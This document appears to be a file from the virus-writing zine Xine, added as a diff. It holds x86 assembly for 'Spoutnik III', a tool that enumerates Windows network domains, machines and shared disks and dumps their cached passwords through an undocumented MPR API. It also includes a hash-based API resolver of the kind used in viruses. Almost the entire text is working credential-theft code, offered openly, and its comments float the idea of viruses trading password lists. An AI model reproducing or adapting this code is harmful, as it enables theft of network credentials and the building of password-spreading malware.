@@ -1,0 +1,576 @@
+   ;                                        /-----------------------------\
+   ;                                        | Xine - issue #4 - Phile 303 |
+   ;                                        \-----------------------------/
+
+   ;
+   ; Spoutnik 3 was build in order to Hack the password and try to combine them
+   ; to other ressource, even imagine viruses on networks that exchange their
+   ; password list, this apps!Ikx call this undocumented API:
+   ;
+   ; WNetEnumCachedPasswords^Ikx:
+   ;    arg1 ->    will be put on the stack when routine called
+   ;    arg2 ->    the routine adress that will receive on ESP+4 the
+   ;           ressource name and the hacked password
+   ;    arg3 ->    number of invocation
+   ;    arg4 ->    set to zero (??? - Unknown)
+   ;    arg5 ->    idem
+   ;
+   ; this is also a ring scanner, it can scan (theorically) all the sub entries of
+   ; a network, this was specially boring to do this, the structure is kinda a
+   ; boucle
+   ;
+   ; This apps doesn't work with that satanic os that bugs on all asm sources: NT
+   ;
+   ; it also(ikx) open a MesageBox with Domain Machine and Disk references...
+   ;
+
+   .386
+   locals
+   .model flat
+
+   extrn           WNetOpenEnumA:Proc
+   extrn           WNetCloseEnum:Proc
+   extrn       WNetEnumResourceA:Proc
+   extrn       WNetAddConnection2A:Proc
+   extrn       WNetCancelConnection2A:Proc
+   extrn           LocalAlloc:Proc
+   extrn           LocalFree:Proc
+   extrn       LoadLibraryA:Proc
+   extrn       MessageBoxA:Proc
+
+   extrn           ExitProcess:Proc
+
+   .data                                   ;the data area
+
+   LastAlloc:  dd  0
+   AllocHandle:    dd  0
+
+   Ressource1: db  'SPouTNiK III (Ikx) (A) Just-Do-It in asm !',0
+
+   Minimport:              ; This is our light version of our
+                       ; import zone
+   db  'KERNEL32.'         ; note the . finish the include
+   db  'MPR.'          ;
+   db  -1
+
+   startapis:
+
+   dd  078a25f37h          ; FreeLibrary
+   dd  0979bA034h          ; WNetGetCachedPassword
+
+   db  -1
+
+
+   type0:  db  ' Global Network: ',-1
+   type1:  db  '   Workgroup: ',-1
+   type2:  db  10,13,'     Machine: ',-1
+   type3:  db  '       Disk: ',-1
+   Type99: db  '       $Password: ',-1
+
+   display:    db  'Note: That program was originally develloped',10,13
+           db  'for Microsoft Network, Check that Global',10,13
+           db  'Network is already loaded',10,13,10,13
+           db  'No entry,',10,13
+           db  10,13
+           db  'StarZ3r0 (IKX) / (IkX) product (ikx) ',10,13,0
+
+           dd  8000h dup (?)
+
+   thatcompare:    dd  ?
+
+   startlist:
+
+   FreeLibrary:    dd  ?           ; invoked apis
+   GetCached:  dd  ?
+
+   displaypointer: dd  ?
+
+   DaddyOffset:    dd  20 dup (?)
+   DaddyOffset2:   dd  20 dup (?)
+   DaddyOffset3:   dd  20 dup (?)
+
+   .code                                   ;executable code starts here
+
+   HOST:
+       xor ebp,ebp
+           lea eax,[ebp+display]
+       mov dword ptr [ebp+displaypointer],eax
+       call    networkscan         ; call the scan routine
+
+       cmp dword ptr [ebp+displaypointer],offset display
+       je  notnow
+       mov eax,dword ptr [ebp+displaypointer]  ; detect if it
+       mov dword ptr [eax],0           ;something was detected
+                               ; else , then don't run
+   notnow:
+       push    0
+       push    offset Ressource1
+       push    offset display
+       push    0
+       call    MessageBoxA             ; show the display
+
+           push    0
+           call    ExitProcess             ; quit
+
+   networkscan:
+
+       lea esi,Minimport
+       call    initapi                 ; detect the MPR
+
+       lea eax,[ebp+Scansubnets]           ; we create articially
+       push    eax                 ; the 1st boucle
+
+   ;   pop ebx
+   ;   push    ebx
+           push    4000h
+           push    0
+           call    LocalAlloc          ;   allocate
+
+           mov     dword ptr [AllocHandle],eax
+
+       push    eax
+       xor ebx,ebx
+       xchg    eax,ebx
+       call    Globalconnection            ; open connections...
+
+       pop eax
+       jmp Scansubnets0
+
+   Scannets:
+
+       call    Checktype               ; look for password
+
+       push    ebx
+       call    Globalconnection            ; open connection
+       pop ebx
+       jc  ReturnUp0
+
+       push    ebx
+           push    4000h
+           push    0
+           call    LocalAlloc              ; allocate it
+           mov     dword ptr [AllocHandle],eax
+       pop ebx
+
+   Scansubnets:
+
+       push    eax
+       Call    EnumResource                ; look all ressources
+       pop eax
+       jc  ReturnUp                ; if no more then
+                               ; finish
+   Scansubnets0:
+
+       push    eax ebx
+   ;   lea ebx,[eax+12]
+       xchg    ebx,eax
+       push    dword ptr [ebp+AllocHandle]
+       call    Scannets                ; detect all sub entry
+       pop dword ptr [ebp+AllocHandle]
+       pop ebx eax
+
+       cmp dword ptr [ebx+20h],0
+       je  ReturnUp                ; if then , finish
+       add ebx,20h
+       jmp     Scannets
+
+   ReturnUp:
+
+       mov     eax,dword ptr [ebp+AllocHandle]
+       push    dword ptr [eax]
+       call    WNetCloseEnum           ; close current Enumeration
+
+       mov     eax,dword ptr [ebp+AllocHandle]
+       push    eax
+       call    LocalFree           ; delocate it
+
+   ReturnUp0:
+
+       cmp dword ptr [ebx+20h],0
+       je  finishscan
+       add ebx,20h
+       jmp     Scannets            ; detect next entry in the
+                           ; buffer
+   finishscan:
+
+       ret
+
+   Globalconnection:
+
+           push    ebx
+           push    eax
+           push    large 3             ; fwdusage
+           push    large 1             ; fwdtype , get only disks & subdirs
+           push    large 2             ; fwdscope
+       call    WNetOpenEnumA
+           add     eax,-1
+           ret
+
+   EnumResource:
+
+       mov     dword ptr [ebx+8],4000h
+       lea ecx,[ebx+8]
+           push    ecx                            ; number of entries = 0FFFFFFFh
+
+       push    eax
+
+       mov     dword ptr [ebx+4],-1
+       lea ecx,[ebx+4]
+           push    ecx                            ; number of entries = 0FFFFFFFh
+
+           push    dword ptr [ebx]                ; handle
+       Call    WNetEnumResourceA
+       add eax,-1
+       ret
+
+   Checktype:
+
+       pushad
+
+       cmp dword ptr [ebx+8],1
+       jne check2              ; if domain then write it on
+                           ; buffer
+       lea ecx,[type1]
+       mov edx,dword ptr [ebx+20]
+       call    droptodisplay
+
+       jmp skipscan
+
+   check2:
+
+       cmp dword ptr [ebx+8],2     ; if machine, save it!
+       jne check3
+
+       lea ecx,[type2]
+       mov edx,dword ptr [ebx+20]
+       call    droptodisplay
+
+       jmp skipscan
+
+   check3:
+
+       cmp dword ptr [ebx+4],1
+       jne skipscan
+
+   thenconnect:
+
+
+       lea ecx,[type3]         ; if disk
+       mov edx,dword ptr [ebx+20]
+
+       call    droptodisplay           ; notice it
+
+       mov al,byte ptr [ebx+12]
+       and al,1
+       cmp al,1                ; as share point, else , forgot
+       jne     skipscan
+
+       cmp dword ptr [ebp+GetCached],0
+       je  skipscan
+
+       lea eax,[ebx+20]
+       mov dword ptr [ebp+thatcompare],eax     ; save the offset of ze
+                           ; name of ressources in memory
+       push    0
+       push    0
+       lea eax,[ebp+Ourcached]
+       push    eax
+
+       push    0FFh
+       push    0
+       push    0
+
+       call    dword ptr [ebp+GetCached]       ; get hacking passwords
+
+       pop eax
+   skipscan:
+   popad
+
+       ret
+
+   Ourcached:
+   push    ebp
+   mov ebp,esp
+   pushad
+
+   lea esi,[ebp+8]
+   mov esi,[esi]
+   xor     ecx,ecx
+   mov cx,word ptr [esi+02]
+   mov     ebx,6900h               ; signify we have the size of
+   mov bl,byte ptr [esi+04]            ; the password
+                           ; this will be taken in account
+                           ; in drop
+   add esi,8
+
+           call    getdel0
+   getdel0:    pop ebp
+           sub ebp,offset getdel0  ; get ebp
+
+           mov edi,dword ptr [ebp+thatcompare]
+           mov edi,dword ptr [edi]
+           dec edi
+   thatsvino:
+           inc edi
+           cmp byte ptr [edi],'\'
+           je  thatsvino       ; eliminate the \\
+                           ; the saved ressource have that
+                           ; followed by the password
+   dec esi
+   dec edi
+   inc ecx
+
+   thenscannext0:
+
+   dec     ecx                 ; check if we have correct
+   inc esi                 ; password
+   inc edi                 ;
+
+   mov al,byte ptr [edi]
+   cmp al,0
+   je  thendroptit
+
+   cmp byte ptr [esi],al
+   jne thenfinish0
+
+   jmp     thenscannext0
+
+   thendroptit:
+
+   cmp ecx,0
+   jne thenfinish0             ; check if it's really good
+                           ; name
+   lea     ecx,[Type99]
+   mov edx,esi
+   call    droptodisplay               ; it's dropped
+
+   thenfinish0:
+
+   mov eax,1
+   popad
+   pop ebp
+   ret 8                       ; return
+
+   droptodisplay:
+
+   push    ebp
+   call    deltaone
+   deltaone:
+   pop ebp
+   sub ebp,offset deltaone         ; it's done!
+
+   mov edi,dword ptr [ebp+displaypointer]
+
+   mov esi,ecx                 ; drop the ecx,-> spec
+   dec esi
+   dec edi
+
+   drapdropit:
+
+   inc esi
+   inc edi
+
+   mov al,byte ptr [esi]
+   mov byte ptr [edi],al
+   cmp al,-1
+   jne drapdropit
+
+   mov esi,edx
+
+   cmp bh,69h                  ;drop the edx -> ressourcE/pass
+   jne drapdropit0             ; this cmp check if we have
+                           ; password size
+   push    ecx
+   xor ecx,ecx
+   mov cl,bl
+   repz    movsb                   ; then repz it
+   pop ecx
+
+   jmp     drapdropto0
+
+   drapdropit0:                    ; else, then copy it
+                           ; until 0 found...
+   dec     esi
+   dec edi
+
+   drapdropit10:
+
+   inc esi
+   inc edi
+
+   mov al,byte ptr [esi]
+   mov byte ptr [edi],al
+   cmp al,0
+   jne drapdropit10
+
+   drapdropto0:
+
+   mov word ptr [edi],0D0Ah            ; drop end of line
+   inc edi
+   inc     edi
+
+   mov dword ptr [ebp+displaypointer],edi
+
+   pop     ebp
+   ret
+
+   include include\reactor.asm
+
+   end HOST
+
+   - include\Reactor.asm - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+   ;
+   ; Modified for Spoutnik III , reactor version 3c , look greenthumb for more
+   ; informations...
+   ;
+   ; This is a multiDLL reactor, it comes from the version 2 of the reactor in
+   ; arianne, hope you enjoy the code! This is version 3a coz it's specialy
+   ; designed for DrGreenThumb.
+   ;
+   ; Version 3: Multiple DLL scanning
+   ;        PseudoImportZone(tm) created
+   ;            Minor changes, large instructions revised and redefined structure
+   ; Version 2: Uses ZeroCRCs
+   ;        Only one loop used
+   ;        NT/95/98 compatible
+   ;        some bugs fixed, structure change, one loop
+   ; Version 1: First prototype - Pretty small
+   ;
+
+
+   initapi:
+
+   dothatnow:
+
+       mov     ebx,esi
+       cmp byte ptr [esi],-1
+       jne     scannext
+       ret
+
+   scannext:
+
+       inc esi
+       cmp     byte ptr [esi-1],'.'
+       jne scannext
+
+       push    esi
+
+       push    dword ptr [esi]
+       push    esi
+       mov dword ptr [esi],'lld'
+       push    ebx
+       call    LoadLibraryA
+
+       cmp eax,-1
+       jne itsokay1
+
+       pop esi
+       ret
+
+   itsokay1:
+
+       mov edi,eax
+       pop esi
+       pop dword ptr [esi]
+
+           mov     ebx,dword ptr [edi+3Ch]
+           add     ebx,edi                         ; ebx point to the PE header
+                                                   ; In fact it's allways PE
+                           ; I skiped the MZ and PE
+                           ; signature check coz if it's
+                           ; not, Kernel can't be loaded :]
+           mov     esi,dword ptr [ebx+120]         ; esi point to the Export
+           lea     esi,[esi+edi]                   ; zone
+
+           mov     ecx,dword ptr [esi+24]          ; ecx = number of export
+           mov     ebx,dword ptr [esi+32]          ; ebx point to the name offset
+           add     ebx,edi                         ; table
+       push    ebp
+       lea     ebp,[ebp+startapis-4]
+
+
+   Scanstring:
+
+
+           mov     edx,dword ptr [ebx]             ; edi point to the 1st
+           add     edx,edi                         ; name
+
+   loophere:
+
+       pushad
+       mov eax,dword ptr [esi+24]
+       sub eax,ecx
+       shl eax,2
+       lea edx,[ebx+eax]
+       mov edx,[edx]
+       add edx,edi
+
+       push    ecx
+           xor     eax,eax
+           xor     ecx,ecx
+
+           mov     al,byte ptr [edx]
+
+   getnamecrc:
+
+           mov     cl,byte ptr [edx]
+           test    ecx,ecx
+           jz      test_crcs
+           rol     eax,3
+           xor     eax,ecx
+           inc     edx
+           jmp     getnamecrc
+
+   test_crcs:
+
+       pop ecx
+       inc edx
+
+   testnext:
+
+       add ebp,4
+       cmp byte ptr [ebp],-1
+       je  suither
+
+           cmp     dword ptr [ebp],eax
+       jne testnext
+
+   getrva:
+
+           mov     ebx,dword ptr [esi+24]
+       sub ebx,ecx
+       shl ebx,1
+
+           add     ebx,dword ptr [esi+36]          ; table RVA
+           add     ebx,edi                         ; Add Rva
+       xor eax,eax             ; seems to be okie!
+       mov ax,word ptr [ebx]       ;
+
+       shl eax,2
+
+       add eax,dword ptr [esi+28]
+       add eax,edi
+
+       mov     eax,dword ptr [eax]
+       add eax,edi
+       dec     ebx
+
+       add ebp,offset startlist-startapis
+       mov dword ptr [ebp],eax
+
+   suither:
+
+       popad
+       loop    loophere
+       pop ebp
+       pop esi
+
+       pushad
+       push    edi
+       mov eax,dword ptr [ebp+FreeLibrary]
+       call    eax
+       popad
+       jmp dothatnow
+
+   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
